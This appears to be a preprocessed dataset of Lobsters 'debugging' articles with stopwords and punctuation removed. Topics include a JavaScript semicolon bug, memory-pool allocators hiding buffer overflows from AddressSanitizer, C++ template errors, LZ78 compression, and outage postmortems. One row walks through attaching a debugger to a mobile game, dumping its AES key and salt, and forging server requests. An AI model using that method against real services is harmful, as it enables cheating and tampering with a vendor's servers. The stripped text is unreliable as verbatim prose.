cargo run running cargo run ctrlc handler work correctly allow u detach target program cleanly limitation since relies tool ida identify block tool incorrectly identifies block could result u inserting breakpoint data possible miss coverage block correctly found nt well really allows fast breakpoints feel free rip apart add hook function could easily used fuzz thing ida tried bunch tool ida one seemed work well binja probably would also work well nt installed familiar api coworker wrote plugin probably get pull requested soon meso file simple file anyone generate tool technical detail minidump autogenned filename generated minidump filename designed give highlevel glance value crash includes thing like exception type faulting address rough classification bug currently access violation apply following classification determine access type read write execute read filename contains read writes filename contains write execute filename contains dep determine noncanonical address noncanonical address filename contains noncanon otherwise determine null dereference within kib null put null filename otherwise considered nonnull deref high appears filename intended severe thing cap give higher glance value prioritizing crash dump look example minidump filename chrome meso file format coming soon stable
224,Lobsters,debugging,Debugging,Can You Find The Bug in This Code?,https://victorzhou.com/blog/a-javascript-bug-i-had-once,find bug code,hint solution wait bug subscribe update post lesson always use semicolon google airbnb jquery always use semicolon,bit javascript print hello world two line function function consolelog hello function consolelog world fails runtime error spot bug without running code scroll hint hint text error typeerror intermediate value function going scroll solution solution one character fix code function function consolelog hello function consolelog world without semicolon last function interpreted argument function call rewrite demonstrates going code run without semicolon const function consolelog hello const function consolelog world function invocation last line called argument return value called argument return value called argument since return value function runtime throw typeerror second invocation semicolon added becomes const function consolelog hello const function consolelog world run expected wait bug yup long story make post soon explaining wrote bad enough code bug subscribe spam real want get notified published update followed made post lesson always use semicolon specific case bit contrived something similar could happen another hello world program fails related reason const hello const b world b foreach consolelog leave figuring one exercise javascript style guide require semicolon including google airbnb jquery summarize always use semicolon
226,Lobsters,debugging,Debugging,"Reverse engineering of a mobile game, part 2: they updated, we dumped memory",https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85,reverse engineering mobile game part updated dumped memory,state thing digging code debugging live process device,state thingsfirst thing first fired mitmproxy checked api call changed update endpoint data look encrypted request response used pure json unreadable byteshowever notice done anything packet replay performing action game produce another tournament query led post body hash generatednext previously need dump new globalmetadatadat file run tool load ida since already know hash loaded crypto class constructor packet built httpclient kickstart bit partsdigging codeafter giving ida time load thousand function let look new updated httppost method since started clean disassembly project relabeled field based dll assembly output reversed net reflector get cleaner pseudocode find friendly cryptocomputehash computes hash value based unencrypted byte byte fed cryptoencrypt method indeed encrypting body sending inspecting method reveals rijndaelbased aes encryption cool thing using standard net crypto method mean field description detail directly net framework documentation well example code replicate encryption decryption process right msdnfinally key salt moved crypto class separate cryptoconstants class change much work lovely game developer even helped u size c field know offset computed key iv stored need manually calculate also spoiler manage calculate properly base salt password reason directly using key iv good enoughso need hack new game revision aes key new salt able encrypt decrypt message forge server could previous articlein previous article stuck retrieving secret byte app code directly made bruteforce originally mentioned alternative method debugging device time choice access byte array directly static code least know best way dump device emulator memory game running get byte live let itdebugging live process deviceour goal dump memory game example time hashing server message dump hashsalt byte aes iv keyto install ida debugging server device run use adb forward port host machine usb done attach ida debugger process device attach process devicebut actually attaching process need set breakpoints pseudocode make process pause ida show corresponding pseudocode line executed phone cpufirst want dump byte appended json body need set breakpoint final salt array appended let break immediately salt byte loaded computehashthen want break encryption key used dump aes key iv memory block note want break portion code executed early need attach debugger line executed found trick make ida run app scratch debugger immediately attached luckily unity assembly take time load tap app icon immediately press home pause game execution giving u time attach ida debugger resume game breaking call decrypt method attaching afterwards finea quick note dalvik ida debugger catch signal sent dalvik vm caused gc signal sigpwr sigxcpu expected need set ignore pas application debugger setup otherwise ida break execution every timethen attaching running game process press button need decrypt calculatehash button performs something online like tournament button debugger pause breakpoints set earlier doubleclick value tagged vsalt reveal memory value skip first byte mono header metadata byte array see salt value eye however aes iv key put raw memory address ida wrap variable need manual brain math pseudocode dword dwcryptoclass dword dword dwcryptoclass know previous article dwcryptoclass value pointer value first field class since start offset second field iv next pointer value pointed dwcryptoclass get actual value two field first need take dwcryptoclass pointer case add give u first pointer address pointer byte since library memory addressing arm instruction set also littleendian address read bottom top jump get actual pointer field byte array two pointer next get operator priority right code extract answer hidden behind two address first field cryptoaeskey second field cryptoivkey address add get actual array byte pointer start data start byte later know iv byte long key byte long fairly standard also noted net documentation since noted pseudocode used class dump enough byte two memory address also infer pseudocodefrom could write small encryptiondecryption using glorious golang sake waste time fiddling algorithm setting let reuse c decrypt message dumped earlier mitmproxy work left encrypted query right decrypted json behind small c decryption program runningwe use methodology dump computehash key since direct vsaltbytes variable able map ida doubleclicking reveals value updating previous hashcalculation feeding decrypted query lead u hash mitm request
227,Lobsters,debugging,Debugging,When your Memory Allocator hides Security Bugs,https://blog.fuzzing-project.org/65-When-your-Memory-Allocator-hides-Security-Bugs.html,memory allocator hide security bug,memory safety bug apache web server together craig young pool allocator find old documentation debugging memory allocation apr collection information custom allocator disable nonissues dreamstime,recently shared information potential memory safety bug apache web server together craig young one issue came context socalled pool allocator apache using pool allocator apache apr library feature allocate pool larger area memory memory allocation within pool essentially separate memory allocation functionality library similar concept exist software would anyone might bring performance benefit memory allocation optimized specific application also make programming convenient allocate many small buffer pool bothering freeing one instead free whole pool allocation within disadvantage pool allocator may hide bug let look simple code example include aprpoolsh include stdioh include stringh int main aprpoolt p char aprinitialize aprpoolcreate p null aprpalloc p aprpalloc p strcpy long strcpy short printf sn compile gcc pkgconfig cflags libs inputc create pool p create two buffer within pool six byte fill buffer string however fill string larger size thus classic buffer overflow printf end output string show garbled output two buffer interfere question find bug course carefully analyze code simple example easy complex software bug hard find manually therefore tool detect unsafe memory access eg buffer overflow use free execution state art tool address sanitizer asan write c code use testing yet start address sanitizer part gcc clang compiler enabled passing fsanitizeaddress command line also add g add debugging information give u better error message let try gcc g fsanitizeaddress pkgconfig cflags libs inputc try find nothing changed still see garbled string address sanitizer detected buffer overflow let try rewriting code plain c without pool allocator include stdioh include stringh include stdlibh int main char malloc malloc strcpy long strcpy short printf sn compile run asan give u nice error message tell u going addresssanitizer heapbufferoverflow address pc bp sp write size thread interceptormemcpy main libcstartmain start located byte right region allocated thread interceptormalloc main libcstartmain error show used pool allocator reason asan built top normal c memory allocation function like mallocfree know anything apr pool asan point view pool one large block memory happening inside relevant thus buffer overflow state art tool detect buffer overflow unable detect obviously good mean pool allocator take one effective way discover important class security bug away u looking solution problem may find old documentation debugging memory allocation apr however relies flag removed apr library helpful however well documented option apr library allows u gain memory safety check back passing enablepooldebugyes configure script effectively disable pool allocator create separate memory allocation call pool allocator compile first example time pool debugger asan see error addresssanitizer heapbufferoverflow address pc bp sp write size thread interceptormemcpy main libcstartmain start located byte right region allocated thread interceptormalloc libcstartmain apache alone custom memory allocation hide bug mozilla nspr n library something called arena pool glib memory slice php zend allocator potential hiding memory safety bug asan yet luckily option turned testing maintain collection information custom allocator disable back apache started reporting use free bug saw debugging option pool allocator learned apache developer incompatibility module pool debugger led reply disclosure nonissues nobody run pool debugger production noted also able reproduce bug without pool debugger latest apache version shared information apache share publicly later indeed seems people run pool debugger production openbsd another problem consider part current apache code incompatible apr pool debugger end unfortunate situation tool like asan report memory safety bug pool debugger know real issue incompatibility turn pool debugger see memory safety bug situation testing apache memory safety bug becomes practically difficult opinion worrying severe security issue image source dreamstime
228,Lobsters,debugging,Debugging,C++ Compile-Time Exceptions -- Debugging C++ templates should be less surreal and horrible,https://blog.esciencecenter.nl/c-compile-time-exceptions-5443f5bf06fe,c compiletime exception debugging c template le surreal horrible,generic programming implicit failure implementation template typename u smartptr const smartptr u cc surreal compiletime exception make intent explicit context specific intention compileexcept compilecerr error initialize smartptr rvalue type smartptr u u implicitly convertible n compilefail list error fmt please let know love make followup post interesting example well defined failure concept rescue concept derived concept found cppreference page concept derived experimental conceptsenabled clang compiler explorer output lourens veen see implementation compiler explorer case compiletime exception reddit twitter,c template error page long really dense basically horrible often helpful user library ask developer help developer often able filter modify error message far productive user post propose adding compiletime exception c allow developer implement custom compiler error casesfor unfamiliar c template allow generic programming meaning write function without immediately specifying type instance mathematical function want able use regular float double precision even integersimplicit failure implementationreading scott meyers timeless classic effective c struck following template item especially templated constructor template typename class smartptr public explicit smartptr realptr template typename u smartptr const smartptr u heldptr otherget get const return heldptr heldptr piece code allow initialize smartptr compatible type instance mean derived type meyers illustrates class top class middle public top class bottom public middle regular pointer top new middle top new bottom const top smartptr template thus emulates behavior regular pointer thanks templated constructor dosmartptr top smartptr middle new middle smartptr top smartptr bottom new bottom smartptr const top trick compile implicit conversion eg middle pointer top pointer allowed course case since middle pointer top pointer plus extra middle stuff however implicit conversion allowed say try initialize child class object parent class one like smartptr bottom smartptr middle new middle compiler complain follows error initialize member subobject type bottom rvalue type middle heldptr otherget note instantiation function template specialization smartptr bottom smartptr middle requested smartptr bottom smartptr middle new middle compileth error generatedwelcome c template hell seeing bytecode look perfectly normal cc debug message ridiculously hard read honestly sometimes laugh hysterically kind error especially go many line often surrealnow honest succeeded cutting clutter le clear message error initialize member subobject type bottom rvalue type middle note obtuse hint error caused template specialization constructor make maybe bit understandable english speaker construct smartptr bottom using smartptr bottom smartptr middle constructor lead error namely initialize member subobject type bottom rvalue type middle compiletime exception make intent explicitthe english exception still convey one crucial fact developer meant error happenand specific reason want emulate behavior regular pointer user smartptr able use class waysbut fact hidden sight compiler message maybe helpful developer certainly helpful endusers mention fact developer probably enduser well help enduser far better compiler error message would therefore similar one used normal pointer instance error initialize object type smartptr bottom rvalue type smartptr middle bit explicit error initialize object type smartptr bottom rvalue type smartptr middle middle implicitly convertible bottomif compiler detect error apparently evidenced error message allow programmer make use would make generic error message context specific example developer add intention way developer meant class used way user template browse documentation parse huge templateerror message rather fix error get back work must assume error message meantthis line thinking lead eurekamoment c compiletime exception consider following bold face modification constructor template typename class smartptr template typename u compileexcept compilecerr error initialize smartptr rvalue type smartptr u u implicitly convertible n compilefail smartptr const smartptr u syntax would mean specific exception occurs compilation template specifically case error code come list error compiler enters block met compiler specific syntax allows developer specifically express intentok maybe need special compile time output stream rather fmt based get point brevity streamprint type u directly mean name printedthis whole approach assumes developer know pitfall api provide improved error message example given think indeed better message sure developer come many good example error message keep frustrating user please let know love make followup post interesting examplesso almost immediately came already enjoying mind fame rich making proposal would obviously bring never heard idea indeed google searching page course still blog lead comparable idea welcome scorn derison ridicule missed something obvious however writing post suddenly realized dismay maybe need compiletime exception least use casewe concept nowwhy concept thought defined failure concept rescue class behavior programmed concept also make code intent explicit make compilation fail earlier point first line template template argument immediately tested compatibility template class instead relying implementation incompatible pointer assignment fail compilationfor instance example one could add derived concept found cppreference page concept template typename typename u concept derived std isbaseof u value concept used constrain allowed template type constructor replacing typename concept template derived u smartptr const smartptr u heldptr otherget really nice expressive syntax want old type u want derived tthe template compiles type u derived say language happens try otherwise get error message able make crystal clear wellthe experimental conceptsenabled clang compiler explorer output source error viable conversion smartptr middle smartptr bottom smartptr bottom smartptr middle new middle compileth source note candidate constructor implicit copy constructor viable known conversion smartptr middle const smartptr bottom argumentclass smartptr source note candidate constructor implicit move constructor viable known conversion smartptr middle smartptr bottom argumentclass smartptr source note candidate template ignored constraint satisfied u middle smartptr const smartptr u initialize held ptr source note derived middle bottom evaluated false template derived u source note std isbaseof bottom middle value evaluated falseconcept derived std isbaseof u value error generatedcompiler returned crystal clear concept pain halt definitely something give nice subtle reminder forgot add templated move constructor also nontemplated implicit copy constructor way scott meyers also reminds item honestly feedback hoping user feedback arrives fourth five source note derived middle bottom evaluated false template derived u like sentence especially start even though evaluated false bit awkward nitpicking still much noise least end userwhat staticassert lourens veen reminded staticassert go unmentioned indeed specific case also made explicit using staticassert template typename u smartptr const smartptr u heldptr otherget staticassert std isbaseof u value u derived approach number issue though still give u two error message see implementation compiler explorer first one pointer triggered heldptr initialization staticassert messagei know could combined concept understand correctly neither concept related constraint body staticassert could gowe still use exactly way want since message staticassert must string literal dynamically display type passed u tmore importantly general error represented boolean condition necessary staticassert syntax error instance definition used since define correct syntax could syntax error case compiletime exceptionsi far c guru also computer scientist would take long time come example corner case compiletime exception would mean hoping c expert chime herealso probably name stick guess describing really exception reasonably recover instance rather customized error message however triggering feel like catching exception perhaps different name hybrid thingnevertheless know debugging c especially templated kind hell much noise wade general casea library developer often good idea kind thing expected go wrong use knowledge make life easier library user get compile error simply say error argument copy ctor smartptr smartptr u u derived something like thatfor work compiler error would need properly classified named detectable much effort etcetera idea whether currently case another question especially compiler expert compile error defined way ie strict enough language could implemented specific exception could even defined like sure leave comment reddit twitter
229,Lobsters,debugging,Debugging,One-bit catastrophe,https://semidoc.github.io/lagarde-catastrophe,onebit catastrophe,onebit catastrophe guillaume lagarde sylvain perifel lempelziv onebit catastrophe tragedy strange scenario introduction lz notation lempelziv lz short algorithm abraham lempel jacob ziv deflate gif gzip onebit catastrophe result theorem theorem high level idea proof de bruijn word open question,onebit catastrophe sep hi today guillaume lagarde give overview recent preprint advisor sylvain perifel lempelziv onebit catastrophe tragedy presented part phd seminar last spring strange scenario imagine compressed file using favorite compression algorithm realize typo file correct adding single bit original file compress get much larger compressed onebit difference much compression algorithm strange behavior lz one famous surprising scenario might well happen overview post introduction lz notation lempelziv lz short algorithm refer bunch lossless compression technique introduced abraham lempel jacob ziv used key ingredient various place deflate gif gzip etc version consider lz work cutting word want compress substring called block block except maybe last one maximal extension previous block letter equal example consider word first block always first letter extension empty word since smallest prefix equal word set since smallest prefix equal word end cut hard see unique cut satisfies property compression algorithm lz encodes block couple pointer predecessor together letter previous word thus encoded compression size number bit needed represent compressed version word equal fact shown order compression size number block show important unique parameter needed number block dictionnary word written set block notation hand size compression rephrased word said incompressible size compression order size word equivalently word incompressible compressible word obtained taking concatenation prefix word compressible word form size dictionnary word onebit catastrophe result onebit catastrophe question asks whether exists compressible infinite word incompressible answer positively question showing main theorem theorem exists infinite word compression ratio change least adding one single bit front fact result tragic seems indeed ratio change word need compressible slowly symbol quite close incompressible word generally precise considering possible variation compression size finite word theorem finite word letter moreover show result tight multiplicative constant particular theorem tell u compressible word size dictionnary remains compressible add letter front ie theorem also tell u compressible word variation change high level idea proof first step understand get weak catastrophe word consider word concatenation prefix word maximal number different substring de bruijn word alone sufficient get weak catastrophe simulation say able prove directly instead need add adaptative way small word prefix called gadget order control parsing simultaneously weak catastrophe hand idea create true catastrophe compressible incompressible word creating probabilistically lot independent de bruijnstyle word used create lot independent weak catastrophe time tuning parameter like size number weak catastrophe together coupled new independent gadget word get catastrophe open question possible push limit far get catastrophe compression ratio change would yield worst possible configuration main challenge mind remove gadget construction would mean weak catastrophe typical case optimally compressible word
230,Lobsters,debugging,Debugging,Best engineering practices: how to fix a bug?,https://dev.to/wemake-services/best-engineering-practices-how-to-fix-a-bug-58g5,best engineering practice fix bug,repeatable software development process developer blamed bug project spotting bug sentry prometheus jump start lifehack reporting bug lifehack screenshots gifs good bug report second one reported template repo reproducing bug regression test lifehack static analysis infrastructureascode fixing bug postmortem drastically different postmortem template afterword subscribe github,basic engineering practice want cover series post starting important one fix bug first think fixing bug important thing bug happen time write code write bug problem repeatable software development process stick work basis people make mistake wrote article long ago developer blamed bug project important thing respond bug people created prevent happening future even know buggy situation even exist spotting bug actually fix something need spot incorrect behavior might tricky consider two case user log account error exactly one user facing strange behavior app local machine time time one easier spot guess guessed right first one bug visible others several factor affect discoverability bug many user affected bug number large enough someone definitely tell reasonable use user monitoring service another question wo nt discus article code executed server much easier create monitoring service catch unexpected thing alert sometimes nt access product created example shipped corporate client use infrastructure also much easier create fixed environment server thirdparty entity wo nt mess around project hard reproduce bug easy reproduce click link type text hit enter bug insane need set special environment install specific software perform strange action reproduce bug luck side important mention bug reproducible ignored course tool help spot bug alert happen sentry help track error code support almost language free selfhosted version also allows collecting direct verbal feedback user prometheus one popular monitoring tool available via dockercompose jump start also paid service like newrelic wombat datadog many others lifehack start sentry cover need simplest setup add service tool need reporting bug bug spotted need reported seems like easy step nt well actually may seem easy sure important part process report good bug need submit lot information issue must tell story think bug maybe feature happen opinion bug without clearly defined expected behavior become really hard fix grow feature request solved differently bug important prove fixed right since bug trifling ignored reproduce issue contain technical information issue version used browser o used configuration applied sometimes even possible create separate repository show issue reproduction look extra information happens log stack trace screenshots monitoring report required input data related bug feature etc link must present submission otherwise would really hard solve issue time pas lifehack screenshots gifs rock system ui try use frequently never use screenshots capture text information stack trace debug output since copied developer let look two example different bug created project first one strict version traceback scope good bug report second one reported bad example bug report violates almost rule defined previously made hurry forget ticket cellphone conversation one user realworld bug report template use project also collection different bug template githubissuetemplates repo feel free use make development process better reproducing bug need reproduce bug hand code remember goal error possible need write regression test fail might unit test matter test failing exposing bug trying solve lifehack sometimes might want submit broken code branch trigger ci build build saved project colleague able link problem next commit solve issue instrument help reproduce complex bug well couple debugger best friend case finding concurrency bug hard sometimes even harder reproduce case fall back static analysis use find bug statically sometimes might need tweak infrastructure infrastructureascode come handy remember bug reproduced reasonable amount time look regression test created wemakepythonstyleguide sneak peak test structure work u codethatbreaks def currentsession telegramid int forupdate bool true telegramsession def defaultoptions conflict pyflakes plugin fighting parent property use custom prefix see http failing line attributeerror excepthandler object attribute depth flake pyflakeschecker module assert flakesroot fixing bug bug spotted reported reproduced actually fix part actually modify codebase remove unexpected behavior hard fixed code submitted code ci build must pas bug fixed one thing wait yes one thing developer tend writing postmortem bug really easy require step bug cost u lot time money take extra care postmortem nontechnical story happened show management one understand included postmortem bug happen must nontechnical summary action lead problem must contain link original bug report done fix bug keep simple go deep technical detail make sure commit linked document impact productusersclients need calculated intelligently guessed timeline remember saved link logsmonitoring etc useful build timeline long suffered bug get solved postmortem required tell story bug future team keeping consistent list important bug drastically improve project documentation always link different postmortem template afterword bug fixed highskilled engineer implementation may vary principle always remains discovery reporting reproduction fixing documenting hope article help project grow subscribe github account want know instrument developer building moment
231,Lobsters,debugging,Debugging,The night of a cascading failure,https://rachelbythebay.com/w/2019/01/20/quiet/,night cascading failure,night cascading failure incredibly big one crash,night cascading failure interesting see random people outside world trying make sense someone else outage using tool available write essay way pitch product end essentially saying thing like u would known noticed traceroutes stopped short actually true go say thing like engineering team likely shut traffic true without meaningful saying nt really help matter engineering team likely shut traffic phrased exactly like could mean anything someone deliberately turned site something crazy going someone triggered epic bug sent traffic black hole mean engineering team shut traffic world difference meaning behind really think traceroute going tell scenario going guessing let talk epic bug instead engineer working request asked token assignment add feature bit plumbing big pseudodatabase used lookup service lot node node parent child relationship actually multiple parent inherit trait desired anyway kind important since used program find instance vast sea computer also used client program find instance server want talk bit like dns ask someone providing x give list candidate host port number sort thing yes dns port number check srv record since important engineer nt mess existing node instead spawn child existing node give name like idea able work safely good idea code plan type command hit enter change propagates outward every single production service go time hard nt come back every single production service nothing survives bit understatement say people noticed oh yeah noticed lot people noticed much wailing gnashing teeth police may called various jurisdiction say could nt access favorite whateveritis really people tried fix middle night nearly everyone remote log bastion machine order fiddle production standard operating procedure ssh bastion ssh production get cracking night nt working ssh would fail would become clear much later ssh failing login process machine needed look user ldap directory service could nt actual connection would fail original outage needed cross production service since dead dead ssh bastion granted people still logged since middle night trying find bring together place start acting coherently interesting let say eventually enough existing connection backdoor glued together people could finally access production see happening found curious pattern every single service registered update node thrown std outofrange error nothing happened silence eventually someone figured happened realized needed go tripping kind bug using dark ninja magic go around nowbroken system reached lowlevel storage system deleted node greatest care propagated outward exception stopped thrown thing came back life part bug came string handling signed number shenanigan let say building quasidatabase certain naming scheme node name anything decide start pinkbunnybasis pbb special actual pbb node parent whole special set others name continue technique let import data legacy system used nothing number identifier let switch entire ecosystem around looking pbbnumber new pseudodatabase get result actually magic going time someone looked something scanned child root pbb node applied string operation first said root pbb child pbb dot number number variable length since might let find long meaningful part string subtracting length length parent sizet newlen childlength parentlength child parent pbb equation newlen next figure sanity check check good right newlen yell return confident good number thanks check proceeded use string comparison operation something like childcompare newlen somenum otherthing dostuff went whatever code worked fine night finally happened underflow length shorter pinkbunnybasis length newlen computation sizet newlen right well nt nt sizet unsigned ca nt represent negative number would ssizet naturally instead giving negative give number incredibly big basically biggest number fit sizet machine le nine bit system probably fun come line later compare run asked compare string starting position string character obviously ca nt per spec give string compare po number greater length string throw outofrange exactly happened lot thing could gone better hopefully people look similarity software stack avoid kind outage except know one point already know say first want rig coding environment wellintentioned useless comparison throw warning remember check see newlen le equal zero since newlen unsigned sizet never le zero might crazy big never negative compiler probably let one zero seemed legit compiler flag enable static analysis checker find use next wish could treat basically string evil black box goo messed term addressing individual element thing compare throwing outofrange basically amount requesting access member exist found way many crash bug c code bad access one subtle nice person notsonice company advised handle kind stuff instead slicing dicing string substring operation like back use regex exquisitely precise exactly wanted get string case almost certainly wanted know string started pinkbunnybasis series digit imagine look like regex ran would either match point could look alldigit group see value granted regexes special circle hell two problem per jwz let avoid poking individual character inside string relatively lowlevel accessors another thing wish would actual separate field element name way nt find concatenate string build name also nt split break back instead abc string imagine pointing b pointing c name still fancypants find value c within group ab happens distinct unit nt string slicing third well whole world die lookup service went certainly bad thing basically meant hard runtime requirement lookup service sane understand unable start cold since idea thing die still alive another thing entirely stop giving result probably keep using last one got scream bloody murder something wrong doomed get restarted somehow open door cache coherency general management issue really want run mode long next say able fix production bastion box interesting concept also worldending dependency get around lot broken stuff ca nt much start shell machine kind hosed option include ldap client somehow last known good schtick mentioned earlier heeding usual cache warning could local account box nt hit ldap emergency could separate set host nt use ldap logins obviously using ldap substitute active directory netware bindery whatever applies situation andor decade happen netware say hi doc brown finally think possibility failure injection let say someone code something nifty claimed survive next outage lookup service know right sure wait next outage go yep thing stayed guess could gross find way make thing throw exception right place put kind knob see happens start failing request like cold night long ago fix actually work sideeffects long survive like want know know long fix future wait morning need wake whole team make sure keep working trigger knob demand make happen periodically preferably without human remember drive spread kind thinking rest infrastructure get people worry kind failure mode service check test add injection mode come way generally stay afloat remember read story knew intrepid engineer change laid people fix problem initially idea traced back thousand change going given moment also could nt log even see list change could list broke bug also could nt even page initially well everything broken take time get handle thing start establishing wrong particularly tool analysis technique suddenly fail back technology chain locate something still working bootstrap back understand happened systemic measurement error real pain hey happens company kind coworkers nt write bug tripped programming note past day start posting cadence drop nt surprised alarmed know cycle put good use
232,Lobsters,debugging,Debugging,Operable Software,https://ferd.ca/operable-software.html,operable software,operable software cindy sridharan rotor simple complex law leaky abstraction secondsystem effect need observability mental model structure observability tcp send offload application component use easy operate expose internals mainly aim provide visibility interaction feedback loop empathy propertybased testing tla,operable software operability observability sure led lot blog post around web lately take post cover view simplicity complexity people actually approach system form mental model rather structure thing want make system observable operable put differently start approaching operator experience thanks cindy sridharan rotor reviewing post simple complex one common piece advice developer receives keep thing simple prevent complexity cost debugging code requires clever wrote therefore clever wrote first time around need doublyclever debug keeping thing simple first time around debugging fixing easier good advice complexity illdefined term wo nt even attempt define clarify instead start high level rather simple system first view straightforward got web server supposedly receives request asks db info writes return response client usually simple web app get assume server stateless replaced without risking anything mistake considering system limited highlevel component directly write could example take view highlevel vision packet tcp connection flow linux kernel nt necessarily know exists answer call may like responsibility thing go bad fixing product manager hr department bet as going likeliest individual dive still rather simple vision nt considered probably running cloud might hypervisor maybe container top may also firewall rule still yet looked web server argument made simple system existed computer small enough could know understand everything going longer case people working backend system cloud bit disingenuous playing layer abstraction practice keeping simple advice targeted top layer application layer operate assumption proper abstraction ignore underlying complexity lower layer build top transparently kind impossible according law leaky abstraction fine let accept vision go back top view possible system wo nt work chance make functional however necessarily reasonable architecture online store get visit month probably fine anything complex would preposterous hand online store thousand visit second dozen employee whose livelihood depend working score commercial partner counting exact architecture would probably considered extremely irresponsible reasonable architecture something importance would try cope predictable failure case would probably end something closer instead want go multiregion setup form loadbalancing across load balancer within region dispatch various web server instance kind complexity becomes unavoidable product becomes popular system grows demand expectation build feature find new issue much impact people rely lead frustration part prevent adoption basically probably write multiregion version first would quite tricky get right first time around see problem ahead encountered since nt apply reasonable approach usually indeed start small system grow go even risky demonstrated secondsystem effect case since working multiple region database strategy need change well data available everywhere could simple report write select sale table may need cover data wo nt fit memory go across region feature may possible make efficient anymore additional robustness system come cost term complexity flexibility revisit feature system grows gain necessary complexity order scale probably accidental complexiy well behaviour change large system behaves small system even fundamentally aim perform task large system behaves small system even small system grown become large system note behaviour limited feature also includes failure failure mode domain small system one node freeze go entirely different failure mode domain large system data synchronization issue crossregion configuration problem partial netsplits follows people operating system adapt well short simple system work guaranteed complex system work usually grown small system trying ship complex system first time around usually gon na go great complexity unavoidable system scale people rely system something serious inevitably become complex simple system behaves differently large system even provide functionality question ask prevent complexity cope need observability want system reliable need know misbehaves bug general approach monitoring nutshell monitoring act asking system checking response fine something feel odd response usually monitoring simple input output common pattern may include opening socket seeing get accepted sending http request seeing get back calculating response time making sure fit given threshold poke check result monitoring generally tell whether something wrong wrong wrong ultimately knowing system fever knowing disease identification fault generally resolved observability whereas monitoring asks observability asks observability come control system speed control car flight stabilizer airplane gist observability according control theory looking output system infer internal state result view know inside may work fine something like thermostat know software observable default send http request get bad gateway back certainly wo nt able figure exactly wrong many case fact actively avoid showing user going want make work look like magic come operation want ability figure going inside software cheat cheat adding kind window black box using log metric kind debugging tool create new output visible u user end kind behind scene backstage pas operator like create enough new output try pretend observable control theory system infer internal state system observing output without messing user experience would look system let get back simple system view make thing bit easier reason got component missing sure code making machine log metric reasonable view system might one want monitoring observability need add green component represent various interface facility related deploying code else going set environment storing consulting log metric gaining access server yellow component bit logical deduction got code deploy code come somewhere surely repository organization list bug expected feature knowledge system code live somewhere view still nt complete missing people people critical component interpret information decide worth investigating decide change system either directly changing configs manipulating state indirectly writing program agent care system behalf everyone impact even nt touch code directly person top right nt touch code yet still lot could part sale staff promise feature exec set new direction priority system understanding hardship system impact way others change system people main actuator creator interpreter system considered part system well must part diagram knowledge history context authority component relationship people part system real potential dictate impact behaviour future let get back bug got monitoring trigger alarm given metric broken threshold chosen one human get alarm start procedure metric observational piece data consult one even consult part training even trained choose training material tricky question turn critical making resilient system code dirty mess operator understand well work fine code pristine marvel engineering operator confused operate massive failure critical variable understanding various human system whole mental model characterize people understanding take look idea behind mental model mental model abstract representation world build based various observation priori knowledge tempting look perfect mental model teach people problem impossible also really necessary illustrate point let refer map map city london uk city london representation accurate street name traffic direction building name river train station metro station footbridge pier park give detail regarding scale distance city london show traffic roadwork show people living wo nt tell good restaurant limited model probably outdated one even really limited detailed detailed enough pretty much anyone ca nt fit head people detailed knowledge part like zoomedin square image pretty much nobody know whole dimension would compare understanding system work tend intimate knowledge narrow section whole thing likely aware linux driver node us nt necessarily know work accounting department may may aware know section know little keep mind source code system probably ship compiled artifact run entirely different environment specific configuration hardware nt desktop short pretty much everyone system work partial incomplete often inaccurate outdated data abstract representation go system fact work might similar like still city london tourist map london closer work take look architecture diagram chance look like map detailed map london map stuff tourist would want look important building main artery get path suggests navigate map welldefined scale pretty sure two giant people borough road wo nt fit inside big ben also bunch undefined area probably supplement source interesting someone asked want go see tate modern get would much better guide gave tourist map gave detailed map chance detailed map going give major information overload since map pretty much model city see chose analogy mental model incomplete outdated even slightly wrong prove useful one especially production incident part system dying ease reason make acceptable decision important factor correct decision might better take somewhat good action making perfect decision later practice model created invalidated updated evolve system keep putting practice thing going wrong change see system take two map london chance neighbourhood live super detailed neighbourhood around workplace everything else might like tourist map going fine evolve city much understanding need drive point let look map london interesting one contains street building tourist attraction location scale bad mean wrongest map yet map likely let get much city previous version faster contains compact description model want connect part city presupposes map knowledge refer already want point various people system build equivalent map based everyday interaction various component system none mental model complete slightly outdated blind spot described wrong different way educate inform people train force keep thing date practical exercise fire drill always going incomplete outdated wrong build model inside head try influence direct impact fine nt need perfect information perfect understanding need good enough model useful good predictive value figure going happen event unfurl model going satisfactory model good enough predicting thing operator going surprise surprise force u revisit improve model intuitively know ca nt predict outcome situation adjust understanding surprise though risk missing change model work nt example live country temperature always may surprised machine waterbased cooling system suddenly break turned got night pipe burst suddenly model always work fine becomes location weatherdependent may even suffer mechanical breakdown use shock system longer machine must include heating element hvac system may care power grid major scope change due previously overlooked variable interesting idea mental model let imagine various way guide debug production system let get back toplevel system view maybe person top left one metric log imago system far term data flow interconnection component might comparable tube map incident bug report look data coming stop quantitative metric interpret go one three people right tend work code may rather ask question like changed code recently maybe know someone another team working pressure ship something late might made mistake maybe changeset pushed prod done developer think really bad nt trust maybe trust know part code really messy nobody time improve surely issue sits shaky part code model perception system one important driving factor point towards debugging procedure opinion one reason devops important practice least want developer able narrow gap development operation understand world act bridge various understanding organizational pattern help enrich everyone model bringing perspective others closer also help decide instrument code codebases like worked huge part log metric chosen arbitrarily often obvious basically given already cpu memory io metric thing like http request log another large part developer put bunch visibility part code nervous would place error handling kind oddly defined uncertain unexpected condition might arise bug showed past shorten investigation add visibility guess thing go bad structure observability lot people seem good idea observability understand program work trickier figuring right tend guesstimate probe go based bug think might encounter let say app house instrumentation observability black box essentially house without window wall every time tricky incident bug investigate eventually solution found add bunch log wish investigation even began adding window wall reason log available would taken u minute find issue rather day investigation next time something similar happens hope easy add visibility wall window area blue visible observable window place app log metric note placed red x place visibility tricky bug show next show shown blue area would nt tricky since log tautological essentially tricky bug tricky nt see coming pepper log metric expect bug shown past never really help future investigation prevent repeating past closing stable door horse bolted left unchecked result like call software engineer house ton ugly window put haphazardly sure got good observability mess point observability take code readability maintainability amount data shown hook point become operational burden need systematic way go thing hear people say know make everything app observable pushed far talked team past wanted make absolutely everything loggable even network traffic put debug log around network call course network traffic expensive log needed turned default needed know going wire investigation could turn reuse house analogy would like building entire house glass way observability real easy seemingly good would nt want full visibility everything nice architectural flair actually counterintuitive practice problem glass house everything observable contains much information lot noise get want know exactly looking look completionist model know specific log line mean know come nt know application work internally provides guidance whatsoever think city map glass house throwing fully detailed city london map might need tourist map especially true incident quick reaction time might critical example message running file descriptor mean little nt know file descriptor needed first place even kind easy seen error idea program might use file descriptor sometimes easy coworker work log line linux said skb ride rocket n slot driver bug tcp send offload turn without context model interpret event information obtained 